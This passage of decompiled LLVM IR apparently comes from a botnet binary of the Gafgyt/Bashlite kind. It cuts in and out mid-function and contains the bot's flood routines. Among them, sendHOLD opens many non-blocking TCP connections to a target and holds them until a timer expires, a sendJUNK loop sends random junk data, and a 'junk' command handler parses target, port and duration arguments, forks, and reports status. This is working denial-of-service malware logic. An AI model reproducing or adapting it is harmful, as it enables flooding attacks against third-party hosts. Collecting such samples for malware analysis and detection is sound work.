  %v2_1000bdb0 = load i32, i32* %v1_1000bd58, align 8
  store i32 268484040, i32* @lr, align 4
  %v3_1000bdc4 = call i32 @connect(i32 %v2_1000bdb0, i32 %v2_1000bbec, i32 16)
  %v4_1000bdd0 = icmp eq i32 %v3_1000bdc4, -1
  br i1 %v4_1000bdd0, label %dec_label_pc_1000bdd8, label %dec_label_pc_1000bdec

dec_label_pc_1000bdd8:                            ; preds = %dec_label_pc_1000bd20
  %v0_1000bdd8 = call i32 @__errno_location()
  %v1_1000bde0 = inttoptr i32 %v0_1000bdd8 to i32*
  %v2_1000bde0 = load i32, i32* %v1_1000bde0, align 4
  %v3_1000bde4 = icmp eq i32 %v2_1000bde0, 115
  br i1 %v3_1000bde4, label %dec_label_pc_1000be0c, label %dec_label_pc_1000bdec

dec_label_pc_1000bdec:                            ; preds = %dec_label_pc_1000bd20, %dec_label_pc_1000bdd8
  %v2_1000bdfc = load i32, i32* %v1_1000bd58, align 8
  store i32 ptrtoint (i32* @global_var_1000be08.485 to i32), i32* @lr, align 4
  %v1_1000be04 = call i32 @close(i32 %v2_1000bdfc)
  br label %dec_label_pc_1000c0b8

dec_label_pc_1000be0c:                            ; preds = %dec_label_pc_1000bdd8
  store i8 1, i8* %v2_1000bcec, align 4
  br label %dec_label_pc_1000c0b8

dec_label_pc_1000be28:                            ; preds = %dec_label_pc_1000bcdc
  store i32 %v2_1000be28, i32* %stack_var_-248, align 4
  store i32 0, i32* %stack_var_-196, align 4
  br label %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge

dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge: ; preds = %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge.dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge_crit_edge, %dec_label_pc_1000be28
  %v3_1000be40.pre = phi i32 [ %v2_1000be28, %dec_label_pc_1000be28 ], [ %v3_1000be40.pre.pre, %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge.dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge_crit_edge ]
  %v1_1000be5847 = phi i32 [ 1, %dec_label_pc_1000be28 ], [ %v1_1000be58, %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge.dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge_crit_edge ]
  %v1_1000be44 = mul nuw nsw i32 %v1_1000be5847, 4
  %v2_1000be48 = add i32 %v1_1000be44, %v3_1000be40.pre
  %v2_1000be50 = inttoptr i32 %v2_1000be48 to i32*
  store i32 0, i32* %v2_1000be50, align 4
  %v1_1000be58 = add nuw nsw i32 %v1_1000be5847, 1
  %tmp45 = icmp ult i32 %v1_1000be58, 32
  br i1 %tmp45, label %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge.dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge_crit_edge, label %dec_label_pc_1000be6c

dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge.dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge
  %v3_1000be40.pre.pre = load i32, i32* %stack_var_-248, align 4
  br label %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge

dec_label_pc_1000be6c:                            ; preds = %dec_label_pc_1000be3c.dec_label_pc_1000be3c_crit_edge
  %v1_1000be7c = inttoptr i32 %v2_1000bce8 to i32*
  %v2_1000be7c = load i32, i32* %v1_1000be7c, align 8
  %v1_1000be80 = udiv i32 %v2_1000be7c, 32
  store i32 %v1_1000be80, i32* @r10, align 4
  %v1_1000be88 = mul nuw nsw i32 %v1_1000be80, 4
  %v1_1000be94 = add i32 %v2_1000be90, %v1_1000be88
  %v1_1000be98 = inttoptr i32 %v1_1000be94 to i32*
  %v2_1000be98 = load i32, i32* %v1_1000be98, align 4
  %v2_1000beac = load i32, i32* %v1_1000be7c, align 8
  %v1_1000beb0 = urem i32 %v2_1000beac, 32
  %v3_1000beb8 = shl i32 1, %v1_1000beb0
  %v2_1000bebc = or i32 %v3_1000beb8, %v2_1000be98
  store i32 %v2_1000bebc, i32* %v1_1000be98, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000bef4 = load i32, i32* %v1_1000be7c, align 8
  %v1_1000bef8 = add i32 %v2_1000bef4, 1
  store i32 268484380, i32* @lr, align 4
  %v5_1000bf18 = call i32 @__libc_select(i32 %v1_1000bef8, i32 0, i32 %v2_1000be28, i32 0, i32 %v2_1000bf00)
  %v3_1000bf28 = icmp eq i32 %v5_1000bf18, 1
  br i1 %v3_1000bf28, label %dec_label_pc_1000bf30, label %dec_label_pc_1000bfcc

dec_label_pc_1000bf30:                            ; preds = %dec_label_pc_1000be6c
  store i32 4, i32* %stack_var_-60, align 4
  %v2_1000bf48 = load i32, i32* %v1_1000be7c, align 8
  store i32 268484460, i32* @lr, align 4
  %v5_1000bf68 = call i32 @getsockopt(i32 %v2_1000bf48, i32 1, i32 4, i32 %v2_1000bf4c, i32 %v2_1000bf50)
  %v3_1000bf6c = load i32, i32* %stack_var_-56, align 4
  %v3_1000bf70 = icmp eq i32 %v3_1000bf6c, 0
  br i1 %v3_1000bf70, label %dec_label_pc_1000bfb0, label %dec_label_pc_1000bf78

dec_label_pc_1000bf78:                            ; preds = %dec_label_pc_1000bf30
  %v2_1000bf88 = load i32, i32* %v1_1000be7c, align 8
  store i32 268484500, i32* @lr, align 4
  %v1_1000bf90 = call i32 @close(i32 %v2_1000bf88)
  store i8 0, i8* %v2_1000bcec, align 4
  br label %dec_label_pc_1000c0b8

dec_label_pc_1000bfb0:                            ; preds = %dec_label_pc_1000bf30
  store i8 2, i8* %v2_1000bcec, align 4
  br label %dec_label_pc_1000c0b8

dec_label_pc_1000bfcc:                            ; preds = %dec_label_pc_1000be6c
  %v4_1000bfd4 = icmp eq i32 %v5_1000bf18, -1
  br i1 %v4_1000bfd4, label %dec_label_pc_1000bfdc, label %dec_label_pc_1000c0b8

dec_label_pc_1000bfdc:                            ; preds = %dec_label_pc_1000bfcc
  %v2_1000bfec = load i32, i32* %v1_1000be7c, align 8
  store i32 268484600, i32* @lr, align 4
  %v1_1000bff4 = call i32 @close(i32 %v2_1000bfec)
  store i8 0, i8* %v2_1000bcec, align 4
  br label %dec_label_pc_1000c0b8

dec_label_pc_1000c014:                            ; preds = %dec_label_pc_1000bd04
  store i32 268484640, i32* @lr, align 4
  %v2_1000c01c = call i32 @realrand(i32 32, i32 1024)
  store i32 268484660, i32* @lr, align 4
  %v2_1000c030 = call i32 @makeRandomShit(i32 %v0_1000bc90, i32 %v2_1000c01c)
  %v1_1000c044 = inttoptr i32 %v2_1000bce8 to i32*
  %v2_1000c044 = load i32, i32* %v1_1000c044, align 8
  store i32 268484704, i32* @lr, align 4
  %v4_1000c05c = call i32 @send(i32 %v2_1000c044, i32 %v0_1000bc90, i32 %v2_1000c01c, i32 16384)
  %v4_1000c068 = icmp eq i32 %v4_1000c05c, -1
  br i1 %v4_1000c068, label %dec_label_pc_1000c070, label %dec_label_pc_1000c0b8

dec_label_pc_1000c070:                            ; preds = %dec_label_pc_1000c014
  %v0_1000c070 = call i32 @__errno_location()
  %v1_1000c078 = inttoptr i32 %v0_1000c070 to i32*
  %v2_1000c078 = load i32, i32* %v1_1000c078, align 4
  %v3_1000c07c = icmp eq i32 %v2_1000c078, 11
  br i1 %v3_1000c07c, label %dec_label_pc_1000c0b8, label %dec_label_pc_1000c084

dec_label_pc_1000c084:                            ; preds = %dec_label_pc_1000c070
  %v2_1000c094 = load i32, i32* %v1_1000c044, align 8
  store i32 268484768, i32* @lr, align 4
  %v1_1000c09c = call i32 @close(i32 %v2_1000c094)
  store i8 0, i8* %v2_1000bcec, align 4
  br label %dec_label_pc_1000c0b8

dec_label_pc_1000c0b8:                            ; preds = %dec_label_pc_1000bd10, %dec_label_pc_1000bfcc, %dec_label_pc_1000c014, %dec_label_pc_1000c070, %dec_label_pc_1000bfdc, %dec_label_pc_1000bfb0, %dec_label_pc_1000bf78, %dec_label_pc_1000be0c, %dec_label_pc_1000bdec, %dec_label_pc_1000c084
  %v1_1000c0bc = add nuw nsw i32 %storemerge28, 1
  %v2_1000c0cc = icmp slt i32 %v1_1000c0bc, %v3_1000bbc0
  br i1 %v2_1000c0cc, label %dec_label_pc_1000bcdc, label %dec_label_pc_1000c0d4.loopexit

dec_label_pc_1000c0d4.loopexit:                   ; preds = %dec_label_pc_1000c0b8, %dec_label_pc_1000c0c4.preheader
  store i32 268484828, i32* @lr, align 4
  %v1_1000c0d8 = call i32 @__GI_time(i32 0)
  %v2_1000c0e4 = icmp slt i32 %v1_1000c0d8, %v2_1000bcc4
  br i1 %v2_1000c0e4, label %dec_label_pc_1000c0c4.preheader, label %dec_label_pc_1000c0ec

dec_label_pc_1000c0c4.preheader:                  ; preds = %dec_label_pc_1000c0c4.preheader.lr.ph, %dec_label_pc_1000c0d4.loopexit
  br i1 %v2_1000c0cc5, label %dec_label_pc_1000bcdc, label %dec_label_pc_1000c0d4.loopexit

dec_label_pc_1000c0ec:                            ; preds = %dec_label_pc_1000c0d4.loopexit, %dec_label_pc_1000bc10, %entry
  %v0_1000c114 = phi i32 [ %v4_1000bbfc, %entry ], [ %v1_1000c0d810, %dec_label_pc_1000bc10 ], [ %v1_1000c0d8, %dec_label_pc_1000c0d4.loopexit ]
  ret i32 %v0_1000c114

; uselistorder directives
  uselistorder i32 %v1_1000c0bc, { 1, 0 }
  uselistorder i32 %v1_1000be58, { 1, 0 }
  uselistorder i8* %v2_1000bcec, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000bce8, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge28, { 2, 0, 1 }
  uselistorder i32 %v2_1000be28, { 1, 0, 2 }
  uselistorder i32 %v2_1000bcc4, { 1, 0 }
  uselistorder i32 %v2_1000bbec, { 1, 0 }
  uselistorder i32 %v1_1000bbd8, { 1, 0 }
  uselistorder i32 %v3_1000bbc0, { 1, 0, 2 }
  uselistorder i32 %v1_1000bbc0, { 1, 0 }
  uselistorder i32 %v0_1000bbb8, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomShit, { 2, 1, 0 }
  uselistorder i32 268484828, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0d4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0b8, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1000bdec, { 1, 0 }
}

define i32 @junk(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = icmp slt i32 %arg3, 3
  br i1 %tmp11, label %dec_label_pc_1000c170, label %dec_label_pc_1000c150

dec_label_pc_1000c150:                            ; preds = %entry
  %v1_1000c154 = add i32 %arg4, 12
  %v1_1000c158 = inttoptr i32 %v1_1000c154 to i32*
  %v2_1000c158 = load i32, i32* %v1_1000c158, align 4
  store i32 268484964, i32* @lr, align 4
  %v1_1000c160 = call i32 @atol(i32 %v2_1000c158)
  %tmp12 = icmp sgt i32 %v1_1000c160, -1
  br i1 %tmp12, label %dec_label_pc_1000c18c, label %dec_label_pc_1000c170

dec_label_pc_1000c170:                            ; preds = %dec_label_pc_1000c150, %entry
  %v6_1000c184 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1002bb9c.486 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000c228

dec_label_pc_1000c18c:                            ; preds = %dec_label_pc_1000c150
  %v1_1000c190 = call i32 @mfork(i32 %arg2)
  %v3_1000c198 = icmp eq i32 %v1_1000c190, 0
  br i1 %v3_1000c198, label %dec_label_pc_1000c1a0, label %dec_label_pc_1000c228

dec_label_pc_1000c1a0:                            ; preds = %dec_label_pc_1000c18c
  %v1_1000c1a4 = add i32 %arg4, 4
  %v1_1000c1a8 = inttoptr i32 %v1_1000c1a4 to i32*
  %v2_1000c1a8 = load i32, i32* %v1_1000c1a8, align 4
  %v1_1000c1b0 = add i32 %arg4, 8
  %v1_1000c1b4 = inttoptr i32 %v1_1000c1b0 to i32*
  %v7_1000c1d4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002bbc0.488 to i32), i32 %arg2, i32 %v2_1000c1a8)
  %v2_1000c1f0 = load i32, i32* %v1_1000c1b4, align 4
  store i32 268485116, i32* @lr, align 4
  %v1_1000c1f8 = call i32 @atol(i32 %v2_1000c1f0)
  store i32 %v1_1000c1f8, i32* @r29, align 4
  %v2_1000c208 = load i32, i32* %v1_1000c158, align 4
  store i32 268485140, i32* @lr, align 4
  %v1_1000c210 = call i32 @atol(i32 %v2_1000c208)
  %v0_1000c218 = load i32, i32* @r28, align 4
  %v0_1000c21c = load i32, i32* @r29, align 4
  %v3_1000c224 = call i32 @sendJUNK(i32 %v0_1000c218, i32 %v0_1000c21c, i32 %v1_1000c210)
  br label %dec_label_pc_1000c228

dec_label_pc_1000c228:                            ; preds = %dec_label_pc_1000c18c, %dec_label_pc_1000c170, %dec_label_pc_1000c1a0
  %v0_1000c244 = phi i32 [ %v1_1000c190, %dec_label_pc_1000c18c ], [ %v6_1000c184, %dec_label_pc_1000c170 ], [ %v3_1000c224, %dec_label_pc_1000c1a0 ]
  ret i32 %v0_1000c244

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c228, { 2, 0, 1 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000c248 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000c248, i32* %stack_var_-256, align 4
  store i32 268485240, i32* @lr, align 4
  %v0_1000c274 = call i32 @getdtablesize()
  %v1_1000c27c = udiv i32 %v0_1000c274, 2
  %v2_1000c27c = and i32 %v0_1000c274, -2147483648
  %v3_1000c27c = or i32 %v1_1000c27c, %v2_1000c27c
  store i32 2, i32* %stack_var_-212, align 4
  %v1_1000c294 = urem i32 %arg2, 65536
  store i32 %v1_1000c294, i32* @r3, align 4
  %v1_1000c29c = call i32 @htons(i32 %v1_1000c294)
  %v2_1000c2a8 = ptrtoint i32* %stack_var_-212 to i32
  %v4_1000c2b8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-208, i32 %v2_1000c2a8)
  %v3_1000c2c0 = icmp eq i32 %v4_1000c2b8, 0
  br i1 %v3_1000c2c0, label %dec_label_pc_1000c2cc, label %dec_label_pc_1000c818

dec_label_pc_1000c2cc:                            ; preds = %entry
  %v2_1000c2d0 = ptrtoint i32* %stack_var_-204 to i32
  store i32 %v2_1000c2d0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268485348, i32* @lr, align 4
  %v0_1000c2e0 = call i32 @__GI_memset()
  %v1_1000c2e8 = mul i32 %v1_1000c27c, 8
  %v1_1000c2f0 = add i32 %v1_1000c2e8, 30
  %v1_1000c2f4 = and i32 %v1_1000c2f0, -16
  %v2_1000c2fc = load i32, i32* %stack_var_-256, align 4
  %v1_1000c304 = load i32, i32* @r1, align 4
  %v3_1000c304 = sub i32 %v1_1000c304, %v1_1000c2f4
  %v4_1000c304 = inttoptr i32 %v3_1000c304 to i32*
  store i32 %v2_1000c2fc, i32* %v4_1000c304, align 4
  %v1_1000c314 = add i32 %v3_1000c304, 23
  %v1_1000c318 = and i32 %v1_1000c314, -16
  %v1_1000c334 = mul i32 %v3_1000c27c, 5
  store i32 %v1_1000c318, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_1000c334, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c348.489 to i32), i32* @lr, align 4
  %v0_1000c344 = call i32 @__GI_memset()
  store i32 268485456, i32* @lr, align 4
  %v1_1000c34c = call i32 @__GI_time(i32 0)
  %v2_1000c358 = add i32 %v1_1000c34c, %arg3
  store i32 268486664, i32* @lr, align 4
  %v1_1000c80413 = call i32 @__GI_time(i32 0)
  %v2_1000c81014 = icmp slt i32 %v1_1000c80413, %v2_1000c358
  br i1 %v2_1000c81014, label %dec_label_pc_1000c7f0.preheader.lr.ph, label %dec_label_pc_1000c818

dec_label_pc_1000c7f0.preheader.lr.ph:            ; preds = %dec_label_pc_1000c2cc
  %v2_1000c7f88 = icmp sgt i32 %v3_1000c27c, 0
  %v2_1000c4bc = ptrtoint i32* %stack_var_-196 to i32
  %v2_1000c520 = ptrtoint i32* %stack_var_-248 to i32
  %v2_1000c524 = add i32 %v2_1000c520, 52
  %v2_1000c594 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1000c5e0 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000c5e4 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_1000c7f0.preheader

dec_label_pc_1000c370:                            ; preds = %dec_label_pc_1000c7f0.preheader, %dec_label_pc_1000c7e4
  %storemerge311 = phi i32 [ %v1_1000c7e8, %dec_label_pc_1000c7e4 ], [ 0, %dec_label_pc_1000c7f0.preheader ]
  %v1_1000c378 = mul i32 %storemerge311, 8
  %v2_1000c37c = add i32 %v1_1000c378, %v1_1000c318
  %v1_1000c380 = or i32 %v2_1000c37c, 4
  %v2_1000c380 = inttoptr i32 %v1_1000c380 to i8*
  %v3_1000c380 = load i8, i8* %v2_1000c380, align 4
  %v1_1000c390 = icmp eq i8 %v3_1000c380, 0
  %v3_1000c390 = icmp eq i8 %v3_1000c380, 1
  br i1 %v3_1000c390, label %dec_label_pc_1000c4bc, label %dec_label_pc_1000c398

dec_label_pc_1000c398:                            ; preds = %dec_label_pc_1000c370
  %v3_1000c39c = icmp eq i8 %v3_1000c380, 2
  br i1 %v3_1000c39c, label %dec_label_pc_1000c6a8, label %dec_label_pc_1000c3a4

dec_label_pc_1000c3a4:                            ; preds = %dec_label_pc_1000c398
  br i1 %v1_1000c390, label %dec_label_pc_1000c3b4, label %dec_label_pc_1000c7e4

dec_label_pc_1000c3b4:                            ; preds = %dec_label_pc_1000c3a4
  store i32 268485576, i32* @lr, align 4
  %v3_1000c3c4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000c3d0 = mul i32 %storemerge311, 8
  %v2_1000c3d4 = add i32 %v1_1000c3d0, %v1_1000c318
  %v2_1000c3d8 = inttoptr i32 %v2_1000c3d4 to i32*
  store i32 %v3_1000c3c4, i32* %v2_1000c3d8, align 8
  %v1_1000c3ec = inttoptr i32 %v2_1000c37c to i32*
  %v2_1000c400 = load i32, i32* %v1_1000c3ec, align 8
  store i32 268485656, i32* @lr, align 4
  %v3_1000c414 = call i32 @fcntl(i32 %v2_1000c400, i32 3, i32 0)
  %v1_1000c41c = or i32 %v3_1000c414, 2048
  %v0_1000c420 = load i32, i32* @r29, align 4
  store i32 268485684, i32* @lr, align 4
  %v3_1000c430 = call i32 @fcntl(i32 %v0_1000c420, i32 4, i32 %v1_1000c41c)
  %v2_1000c444 = load i32, i32* %v1_1000c3ec, align 8
  store i32 268485724, i32* @lr, align 4
  %v3_1000c458 = call i32 @connect(i32 %v2_1000c444, i32 %v2_1000c2a8, i32 16)
  %v4_1000c464 = icmp eq i32 %v3_1000c458, -1
  br i1 %v4_1000c464, label %dec_label_pc_1000c46c, label %dec_label_pc_1000c480

dec_label_pc_1000c46c:                            ; preds = %dec_label_pc_1000c3b4
  %v0_1000c46c = call i32 @__errno_location()
  %v1_1000c474 = inttoptr i32 %v0_1000c46c to i32*
  %v2_1000c474 = load i32, i32* %v1_1000c474, align 4
  %v3_1000c478 = icmp eq i32 %v2_1000c474, 115
  br i1 %v3_1000c478, label %dec_label_pc_1000c4a0, label %dec_label_pc_1000c480

dec_label_pc_1000c480:                            ; preds = %dec_label_pc_1000c3b4, %dec_label_pc_1000c46c
  %v2_1000c490 = load i32, i32* %v1_1000c3ec, align 8
  store i32 ptrtoint (i32* @global_var_1000c49c.490 to i32), i32* @lr, align 4
  %v1_1000c498 = call i32 @close(i32 %v2_1000c490)
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c4a0:                            ; preds = %dec_label_pc_1000c46c
  store i8 1, i8* %v2_1000c380, align 4
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c4bc:                            ; preds = %dec_label_pc_1000c370
  br label %dec_label_pc_1000c4d0

dec_label_pc_1000c4d0:                            ; preds = %dec_label_pc_1000c4bc, %dec_label_pc_1000c4d0
  %storemerge57 = phi i32 [ 0, %dec_label_pc_1000c4bc ], [ %v1_1000c4ec, %dec_label_pc_1000c4d0 ]
  %v1_1000c4d8 = mul nuw nsw i32 %storemerge57, 4
  %v2_1000c4dc = add i32 %v1_1000c4d8, %v2_1000c4bc
  %v2_1000c4e4 = inttoptr i32 %v2_1000c4dc to i32*
  store i32 0, i32* %v2_1000c4e4, align 4
  %v1_1000c4ec = add nuw nsw i32 %storemerge57, 1
  %tmp48 = icmp ult i32 %v1_1000c4ec, 32
  br i1 %tmp48, label %dec_label_pc_1000c4d0, label %dec_label_pc_1000c500

dec_label_pc_1000c500:                            ; preds = %dec_label_pc_1000c4d0
  %v1_1000c510 = inttoptr i32 %v2_1000c37c to i32*
  %v2_1000c510 = load i32, i32* %v1_1000c510, align 8
  %v1_1000c514 = udiv i32 %v2_1000c510, 32
  %v1_1000c51c = mul nuw nsw i32 %v1_1000c514, 4
  %v1_1000c528 = add i32 %v1_1000c51c, %v2_1000c524
  %v1_1000c52c = inttoptr i32 %v1_1000c528 to i32*
  %v2_1000c52c = load i32, i32* %v1_1000c52c, align 4
  %v1_1000c544 = urem i32 %v2_1000c510, 32
  %v3_1000c54c = shl i32 1, %v1_1000c544
  %v2_1000c550 = or i32 %v3_1000c54c, %v2_1000c52c
  store i32 %v2_1000c550, i32* %v1_1000c52c, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000c588 = load i32, i32* %v1_1000c510, align 8
  %v1_1000c58c = add i32 %v2_1000c588, 1
  store i32 268486064, i32* @lr, align 4
  %v5_1000c5ac = call i32 @__libc_select(i32 %v1_1000c58c, i32 0, i32 %v2_1000c4bc, i32 0, i32 %v2_1000c594)
  %v3_1000c5bc = icmp eq i32 %v5_1000c5ac, 1
  br i1 %v3_1000c5bc, label %dec_label_pc_1000c5c4, label %dec_label_pc_1000c660

dec_label_pc_1000c5c4:                            ; preds = %dec_label_pc_1000c500
  store i32 4, i32* %stack_var_-60, align 4
  %v2_1000c5dc = load i32, i32* %v1_1000c510, align 8
  store i32 268486144, i32* @lr, align 4
  %v5_1000c5fc = call i32 @getsockopt(i32 %v2_1000c5dc, i32 1, i32 4, i32 %v2_1000c5e0, i32 %v2_1000c5e4)
  %v3_1000c600 = load i32, i32* %stack_var_-56, align 4
  %v3_1000c604 = icmp eq i32 %v3_1000c600, 0
  br i1 %v3_1000c604, label %dec_label_pc_1000c644, label %dec_label_pc_1000c60c

dec_label_pc_1000c60c:                            ; preds = %dec_label_pc_1000c5c4
  %v2_1000c61c = load i32, i32* %v1_1000c510, align 8
  store i32 268486184, i32* @lr, align 4
  %v1_1000c624 = call i32 @close(i32 %v2_1000c61c)
  store i8 0, i8* %v2_1000c380, align 4
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c644:                            ; preds = %dec_label_pc_1000c5c4
  store i8 2, i8* %v2_1000c380, align 4
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c660:                            ; preds = %dec_label_pc_1000c500
  %v4_1000c668 = icmp eq i32 %v5_1000c5ac, -1
  br i1 %v4_1000c668, label %dec_label_pc_1000c670, label %dec_label_pc_1000c7e4

dec_label_pc_1000c670:                            ; preds = %dec_label_pc_1000c660
  %v2_1000c680 = load i32, i32* %v1_1000c510, align 8
  store i32 268486284, i32* @lr, align 4
  %v1_1000c688 = call i32 @close(i32 %v2_1000c680)
  store i8 0, i8* %v2_1000c380, align 4
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c6a8:                            ; preds = %dec_label_pc_1000c398
  store i32 %v2_1000c4bc, i32* %stack_var_-248, align 4
  store i32 0, i32* %stack_var_-196, align 4
  br label %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge

dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge: ; preds = %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge.dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge_crit_edge, %dec_label_pc_1000c6a8
  %v3_1000c6c0.pre = phi i32 [ %v2_1000c4bc, %dec_label_pc_1000c6a8 ], [ %v3_1000c6c0.pre.pre, %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge.dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge_crit_edge ]
  %v1_1000c6d851 = phi i32 [ 1, %dec_label_pc_1000c6a8 ], [ %v1_1000c6d8, %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge.dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge_crit_edge ]
  %v1_1000c6c4 = mul nuw nsw i32 %v1_1000c6d851, 4
  %v2_1000c6c8 = add i32 %v1_1000c6c4, %v3_1000c6c0.pre
  %v2_1000c6d0 = inttoptr i32 %v2_1000c6c8 to i32*
  store i32 0, i32* %v2_1000c6d0, align 4
  %v1_1000c6d8 = add nuw nsw i32 %v1_1000c6d851, 1
  %tmp49 = icmp ult i32 %v1_1000c6d8, 32
  br i1 %tmp49, label %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge.dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge_crit_edge, label %dec_label_pc_1000c6ec

dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge.dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge_crit_edge: ; preds = %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge
  %v3_1000c6c0.pre.pre = load i32, i32* %stack_var_-248, align 4
  br label %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge

dec_label_pc_1000c6ec:                            ; preds = %dec_label_pc_1000c6bc.dec_label_pc_1000c6bc_crit_edge
  %v1_1000c6fc = inttoptr i32 %v2_1000c37c to i32*
  %v2_1000c6fc = load i32, i32* %v1_1000c6fc, align 8
  %v1_1000c700 = udiv i32 %v2_1000c6fc, 32
  %v1_1000c708 = mul nuw nsw i32 %v1_1000c700, 4
  %v1_1000c714 = add i32 %v1_1000c708, %v2_1000c524
  %v1_1000c718 = inttoptr i32 %v1_1000c714 to i32*
  %v2_1000c718 = load i32, i32* %v1_1000c718, align 4
  %v1_1000c730 = urem i32 %v2_1000c6fc, 32
  %v3_1000c738 = shl i32 1, %v1_1000c730
  %v2_1000c73c = or i32 %v3_1000c738, %v2_1000c718
  store i32 %v2_1000c73c, i32* %v1_1000c718, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000c774 = load i32, i32* %v1_1000c6fc, align 8
  %v1_1000c778 = add i32 %v2_1000c774, 1
  store i32 268486556, i32* @lr, align 4
  %v5_1000c798 = call i32 @__libc_select(i32 %v1_1000c778, i32 0, i32 0, i32 %v2_1000c4bc, i32 %v2_1000c594)
  %v3_1000c7a8 = icmp eq i32 %v5_1000c798, 0
  br i1 %v3_1000c7a8, label %dec_label_pc_1000c7e4, label %dec_label_pc_1000c7b0

dec_label_pc_1000c7b0:                            ; preds = %dec_label_pc_1000c6ec
  %v2_1000c7c0 = load i32, i32* %v1_1000c6fc, align 8
  store i32 268486604, i32* @lr, align 4
  %v1_1000c7c8 = call i32 @close(i32 %v2_1000c7c0)
  store i8 0, i8* %v2_1000c380, align 4
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c7e4:                            ; preds = %dec_label_pc_1000c3a4, %dec_label_pc_1000c660, %dec_label_pc_1000c6ec, %dec_label_pc_1000c4a0, %dec_label_pc_1000c480, %dec_label_pc_1000c670, %dec_label_pc_1000c644, %dec_label_pc_1000c60c, %dec_label_pc_1000c7b0
  %v1_1000c7e8 = add nuw nsw i32 %storemerge311, 1
  %v2_1000c7f8 = icmp slt i32 %v1_1000c7e8, %v3_1000c27c
  br i1 %v2_1000c7f8, label %dec_label_pc_1000c370, label %dec_label_pc_1000c800.loopexit

dec_label_pc_1000c800.loopexit:                   ; preds = %dec_label_pc_1000c7e4, %dec_label_pc_1000c7f0.preheader
  store i32 268486664, i32* @lr, align 4
  %v1_1000c804 = call i32 @__GI_time(i32 0)
  %v2_1000c810 = icmp slt i32 %v1_1000c804, %v2_1000c358
  br i1 %v2_1000c810, label %dec_label_pc_1000c7f0.preheader, label %dec_label_pc_1000c818

dec_label_pc_1000c7f0.preheader:                  ; preds = %dec_label_pc_1000c7f0.preheader.lr.ph, %dec_label_pc_1000c800.loopexit
  br i1 %v2_1000c7f88, label %dec_label_pc_1000c370, label %dec_label_pc_1000c800.loopexit

dec_label_pc_1000c818:                            ; preds = %dec_label_pc_1000c800.loopexit, %dec_label_pc_1000c2cc, %entry
